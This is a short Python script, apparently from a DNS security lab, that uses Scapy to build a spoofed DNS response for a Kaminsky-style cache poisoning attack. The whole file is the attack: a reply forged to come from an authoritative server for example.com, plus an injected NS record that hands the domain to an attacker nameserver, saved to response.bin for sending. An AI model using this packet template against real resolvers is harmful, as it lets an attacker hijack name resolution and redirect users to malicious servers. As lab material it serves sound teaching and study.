#!/usr/bin/env python

from scapy.all import *
conf.L3socket=L3RawSocket

ip = IP(src="199.43.135.53", dst="10.0.2.5")
udp = UDP(sport=53, dport=33333)

target_name = "aaaaa.example.com"
target_domain = "example.com"

qd_sec = DNSQR(qname=target_name)
ans_sec = DNSRR(rrname=target_name, type="A",
    		rdata="1.2.3.4", ttl=259200)
ns_sec = DNSRR(rrname=target_domain, type="NS",
    		rdata="ns.dnslabattacker.net", ttl=259200)

dns = DNS(id=0xAAAA, 
    	qr=1, aa=1, rd=0, 
    	qdcount=1, nscount=1, ancount=1,
    	qd=qd_sec, ns=ns_sec, an=ans_sec) 

spoof_pkt = ip/udp/dns
#send(spoof_pkt)

with open("response.bin", "wb") as f:
  f.write(bytes(spoof_pkt))
